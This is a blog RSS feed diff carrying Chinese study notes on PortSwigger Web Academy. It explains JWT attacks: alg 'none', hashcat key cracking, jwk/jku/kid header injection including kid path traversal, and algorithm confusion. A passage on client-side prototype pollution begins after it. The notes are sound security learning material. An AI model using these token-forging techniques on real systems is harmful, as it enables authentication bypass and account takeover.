+    <author>suo yuan</author>
+    <guid>http://localhost:1313/posts/portswigger_jwt/</guid>
+    <description><![CDATA[<p>PortSwigger Web Academy 中关于 JWT 的部分</p>
+<h1 id="jwt-attacks">JWT attacks</h1>
+<h2 id="jwt">JWT</h2>
+<p>JSON Web Tokens (JWT)，是一种在不同系统之前发送加密签名过的JSON数据的标准格式。通常用于发送关于用户的相关信息。</p>
+<h3 id="jwt组成">JWT组成</h3>
+<ul>
+<li>header</li>
+<li>payload</li>
+<li>signature</li>
+</ul>
+<p>如下面的例子所示，三部分之间用<code>.</code>分隔</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA</span></span></code></pre></div></div>
+<p>header和payload两个部分都是base64_url编码的JSON对象，header包括令牌本身的数据，payload包括关于用户实际的声明。例如上述的令牌的payload解码后就是：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;iss&#34;</span><span class="p">:</span> <span class="s2">&#34;portswigger&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;exp&#34;</span><span class="p">:</span> <span class="mi">1648037164</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Carlos Montoya&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;sub&#34;</span><span class="p">:</span> <span class="s2">&#34;carlos&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;blog_author&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;email&#34;</span><span class="p">:</span> <span class="s2">&#34;carlos@carlos-montoya.net&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;iat&#34;</span><span class="p">:</span> <span class="mi">1516239022</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>大多数情况下，能拿到令牌就意味着能够修改它，所以基于JWT机制的安全性都依赖于加密签名。</p>
+<h3 id="jwt-signature">JWT signature</h3>
+<p>发出令牌的签名通常由对header和payload消息摘要算法处理而成。有时候会把消息摘要算法处理过的结果进行加密。无论时候进行后续的加密，这个过程都会涉及到一个密钥。</p>
+<ul>
+<li>由于signature包括令牌的其他部分，所以更改header或paylaod都会导致signature不匹配</li>
+<li>如果不知道密钥，就不能根据header和payload生成正确的signatire</li>
+</ul>
+<h3 id="jwt-jws-jwe">JWT JWS JWE</h3>
+<p>JWT只定义了一种表达信息的格式作为一个在不同系统之间传递的JSON对象。事实上JWT并不是作为独立的实体使用。JWT由JSON Web Signature (JWS)和JSON Web Encryption (JWE)扩展而成，它们定义实现JWT的具体方法。</p>
+<p>JWT通常时JWS或JWE令牌。通常使用JWT的时候都在说JWS令牌。JWEs和它相似，只不过令牌的内容时加密的而非编码的。</p>
+<h2 id="jwt攻击">JWT攻击</h2>
+<h3 id="概述">概述</h3>
+<p>JWT攻击就是修改用户发送给服务器的JWT，通常用于模拟另一个身份去绕过身份验证和一些访问上的限制。</p>
+<h3 id="漏洞产生条件">漏洞产生条件</h3>
+<p>JWT漏洞通常因为网站对JWT的处理有问题而产生，因为很多实现细节是由网站开发者自己确定的。</p>
+<p>这些问题通常就是JWT的signature没有得到正确的验证，或者密钥是否被暴力破解或泄露。</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="接收任意signatures">接收任意signatures</h4>
+<p>JWT库提供了两个方法，一个用于验证令牌，一个只用于解码。例如Node.js的<code>jsonwebtoken</code>库有<code>verify()</code>和<code>decode()</code>。如果开发者并不清楚这两个方法，只是将令牌给了<code>decode()</code>，那么signature也就形同虚设了。</p>
+<h4 id="没有signature的令牌">没有signature的令牌</h4>
+<p>JWT的header中有个<code>alg</code>参数，它指明了服务器使用那种算法对令牌进行签名。</p>
+<p>服务器信任<code>alg</code>参数指定的算法，攻击者可以选择修改算法名称。<code>alg</code>参数可以被设置为<code>none</code>并删除signature，服务器通常会拒绝这样的令牌，有时候可以通过混淆来绕过对这样字符串的过滤。虽然没有了signature，但是payload和signature之间的<code>.</code>需要保留。</p>
+<h4 id="暴力破解密钥">暴力破解密钥</h4>
+<p>一些消息摘要算法使用任意字符串作为密钥，像HS256(HMAC + SHA-256)。</p>
+<p>开发者实现JWT时可能会犯一些错误，比如使用弱密码，这时候攻击者可以选择暴力破解这个密钥。</p>
+<h5 id="使用hashcat">使用hashcat</h5>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -a <span class="m">0</span> -m <span class="m">16500</span> &lt;jwt&gt; &lt;wordlist&gt;</span></span></code></pre></div></div>
+<h4 id="jwt-header参数注入">JWT header参数注入</h4>
+<p>JWS规定header中必须有<code>alg</code>参数，实际上JWT的header还有其他参数，比如：</p>
+<ul>
+<li>jwk (JSON Web Key)，提供一个表示key的JSON对象</li>
+<li>jku (JSON Web Key Set URL)，提供了一个可以让服务器从中获取包含正确密钥的一组密钥的URL</li>
+<li>kid (Key ID)，提供一个当有多个密钥的情况下用于确定正确密钥的ID</li>
+</ul>
+<p>这些参数用于服务器验证signature使用哪个密钥。</p>
+<h5 id="注入jwk参数">注入jwk参数</h5>
+<p>服务器使用该参数将其公钥以jwk格式嵌入令牌中，例如：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;RS256&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;jwk&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;kty&#34;</span><span class="p">:</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;AQAB&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>服务器会使用公钥白名单来验证JWT的signature，然而错误的配置服务器会导致它使用jwk中的任何密钥。攻击者可以用自己的RSA私钥处理一个修改后的JWT，然后将匹配的公钥放在jwk中。</p>
+<h5 id="注入jku参数">注入jku参数</h5>
+<p>从中获取到的是一个JSON对象：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;keys&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;kty&#34;</span><span class="p">:</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;AQAB&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;kty&#34;</span><span class="p">:</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;AQAB&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>攻击者通过修改jku指向的URL，修改后的URL存储自己的密钥信息，就可以通过校验</p>
+<h5 id="注入kid参数">注入kid参数</h5>
+<p>服务器可能会使用多个密钥对不同类型的数据进行签名，这样JWT的header可能包含一个<code>kid</code>参数用于确定验证签名时使用哪个密钥。</p>
+<p>JWS规范没有定义<code>kid</code>的具体结构，这是开发人员选择的一个任意的字符串。<code>kid</code>可以是指向数据库的特定条目，甚至指向一个文件名。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;../../path/to/file&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;k&#34;</span><span class="p">:</span> <span class="s2">&#34;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>如果服务器支持对称加密算法处理的JWT，攻击者可以使<code>kid</code>参数指向一个已知的文件，并且使用与该文件内容对应的密钥。例如指向<code>/dev/null</code>这个文件，使用Base64编码过的空字节对令牌进行对称加密。如果密钥被存储在数据库中，<code>kid</code>参数还是一个可能出现SQL注入的地方。</p>
+<h5 id="其他参数">其他参数</h5>
+<ul>
+<li>cty (Content Type)，通常在不会存在于header中，但是底层解析库无疑是支持它的。将<code>cty</code>的值改成<code>text/xml</code>或<code>application/x-java-serialized-object</code>，这可能会造成XXE或反序列化。</li>
+<li>x5c (X.509 Certificate Chain)，用于传递密钥的X.509公钥证书或证书链。该参数可以被注入自签名的证书。<code>CVE-2017-2800</code>和<code>CVE-2018-2633</code></li>
+</ul>
+<h4 id="算法混淆">算法混淆</h4>
+<p>算法混淆（密钥混淆）是因为攻击者可以强制服务器使用网站开发者没想到的算法来验证JWT的signature。</p>
+<h5 id="对称加密与非对称加密">对称加密与非对称加密</h5>
+<p>JWT可以使用不同的算法进行签名处理。HS256 (HMAC + SHA-256)使用对称的密钥，这意味着加解密用的是同一个密钥。RS256 (RSA + SHA-256)使用非对称的密钥，这包括公钥（用于验证签名）和私钥（即可签名可以验证）。</p>
+<h5 id="漏洞产生">漏洞产生</h5>
+<p>由于JWT库的实现的缺陷，通常会出现算法混淆漏洞。尽管现实中的验证过程所使用的算法会有所不同，但很多库提供来一种单一且与算法无关的方法来验证签名。这种方法依赖于<code>alg</code>参数确定验证类型。</p>
+<p>下面的伪代码展示来一个通用的<code>verify()</code>函数可能是什么样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">secretOrPublicKey</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">algorithm</span> <span class="o">=</span> <span class="nx">token</span><span class="p">.</span><span class="nx">getAlgHeader</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">algorithm</span> <span class="o">==</span> <span class="s2">&#34;RS256&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Use the provided key as an RSA public key
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">algorithm</span> <span class="o">==</span> <span class="s2">&#34;HS256&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Use the provided key as an HMAC secret key
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>假设使用这种函数的网站开发者用它专门处理非对称加密算法</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">publicKey</span> <span class="o">=</span> <span class="o">&lt;</span><span class="kr">public</span><span class="o">-</span><span class="nx">key</span><span class="o">-</span><span class="k">of</span><span class="o">-</span><span class="nx">server</span><span class="o">&gt;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">token</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">getCookie</span><span class="p">(</span><span class="s2">&#34;session&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>这种情况下，服务器接收一个对称加密算法处理的令牌，<code>verify()</code>函数会把公钥视作密钥。攻击者可以使用非对称加密的公钥对令牌进行签名，服务器用公钥来验证签名。</p>
+<h5 id="攻击步骤">攻击步骤</h5>
+<ol>
+<li>获取服务器公钥</li>
+<li>转换公钥的格式</li>
+<li>修改JWT的payload和header的<code>alg</code></li>
+<li>使用公钥作为密钥对其进行签名</li>
+</ol>
+<h6 id="获取服务器公钥">获取服务器公钥</h6>
+<p>服务器有时会通过<code>/jwks.json</code>或<code>/.well-known/jwks.json</code>将公钥作为JWK (JSON Web Key)公开。</p>
+<p>即使不公开，也可以根据多个已知的JWT搞出公钥。</p>
+<p>对于上述情况，GitHub的<a href="https://github.com/silentsignal/rsa_sign2n" target="_blank" rel="noopener noreffer ">rsa_sign2n</a>仓库存在<code>jwt_forgery.py</code>等脚本对此有所帮助。</p>
+<h6 id="转换公钥的格式">转换公钥的格式</h6>
+<p>虽然服务器可能会公开它们的公钥，但是验证令牌的signature的时候用的是本地文件或数据库中存储的副本，这俩之前可能以不同的形式存储。</p>
+<p>为了保证攻击成功，攻击者需要保证用来签名的密钥和服务器的不仅格式一致，每一个字节都是一样的。比如可能需要的是<code>X.509 PEM</code>格式的密钥，但获得的是<code>JWK</code>格式。</p>]]></description>
+</item>
+<item>
+    <title>Client-side prototype pollution</title>
+    <link>http://localhost:1313/posts/portswigger_ppul/</link>
+    <pubDate>Sun, 25 Dec 2022 03:42:51 &#43;0000</pubDate>
+    <author>suo yuan</author>
+    <guid>http://localhost:1313/posts/portswigger_ppul/</guid>
+    <description><![CDATA[<p>PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分</p>
+<h1 id="client-side-prototype-pollution">Client-side prototype pollution</h1>
+<h2 id="概述">概述</h2>
+<p>prototype污染是一个JavaScript漏洞，该漏洞使得攻击者可以向全局prototype添加proerties，这些properties可能会被用户定义的对象继承。</p>
+<p>通常prototype污染都是和其他漏洞一起利用打组合拳。</p>
+<h2 id="javascript-prototypes">JavaScript prototypes</h2>
+<p>和其他基于类的语言不同，JavaScript使用Prototypes继承模型。</p>
+<h3 id="对象">对象</h3>
+<p>JavaScript的对象实际上就是被称为properties的键值对</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;wiener&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">userId</span><span class="o">:</span> <span class="mi">01234</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">isAdmin</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div></div>
+<p>访问一个对象的proerties可以通过如下两种方式</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span> <span class="c1">// &#34;wiener&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">user</span><span class="p">[</span><span class="s2">&#34;userId&#34;</span><span class="p">];</span> <span class="c1">// 01234
+</span></span></span></code></pre></div></div>
+<p>properties同样也可以是函数，被称为方法</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;wiener&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">userId</span><span class="o">:</span> <span class="mi">01234</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">exampleMethod</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// do something
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div></div>
+<h3 id="prototypes">prototypes</h3>
+<p>任何一个JavaScript的对象被链接到另一种类型的对象，被称之为prototype。默认情况下，JavaScript自动为新对象分配其内置的全局prototype之一。例如string会被自动被分配内置的String.prototype。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">myObject</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">getPrototypeOf</span><span class="p">(</span><span class="nx">myObject</span><span class="p">);</span> <span class="c1">// Object.prototype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">myString</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">getPrototypeOf</span><span class="p">(</span><span class="nx">myString</span><span class="p">);</span> <span class="c1">// String.prototype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">myArray</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">getPrototypeOf</span><span class="p">(</span><span class="nx">myArray</span><span class="p">);</span> <span class="c1">// Array.prototype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">myNumber</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">getPrototypeOf</span><span class="p">(</span><span class="nx">myNumber</span><span class="p">);</span> <span class="c1">// Number.prototype
+</span></span></span></code></pre></div></div>
+<p>对象自动继承被分配的prototype的所有properties，除非该对象已经有了相关的定义。这允许开发者创建新的类重用已有的类的properties或方法。</p>
+<p>内置全局prototypes提供了一些有用的properties和方法去处理基本的数据类型。例如<code>String.prototype</code>有<code>toLowerCase()</code>方法，这可以让字符串自然就存在一个随时可用的方法将他们转换成lowercase，这就节省了开发者的精力。</p>
+<h3 id="对象继承">对象继承</h3>
+<p>当引用一个对象的property的时候，JavaScript引擎会先在对象本身去寻找，没找到再去对应的全局prototype寻找</p>
+<h3 id="prototype链">prototype链</h3>
+<p>每一个对象的prototype也是一个对象，这个对象同样也会有对应的prototype。JavaScript中几乎所有的东西都是一个对象，这个链的终点就是<code>Object.prototype</code>，它的prototype是null。</p>
+<h3 id="__proto__">__proto__</h3>
+<p>每个对象都有一个特殊的property去访问他的prototype。虽然这没有一个正式标准化的名字，但是大多数浏览器以<code>__proto__</code>作为行业标准。这个property提供了读写两种操作，不仅可以读取prototype和他的properties，并且还可以在必要的时候修改它。</p>
+<p>同样有两种方法访问<code>__proto__</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">username</span><span class="p">[</span><span class="s2">&#34;__proto__&#34;</span><span class="p">];</span></span></span></code></pre></div></div>
+<p>也可以多来几个访问prototype的prototype</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span> <span class="c1">// String.prototype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span> <span class="c1">// Object.prototype
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">username</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span> <span class="c1">// null
+</span></span></span></code></pre></div></div>
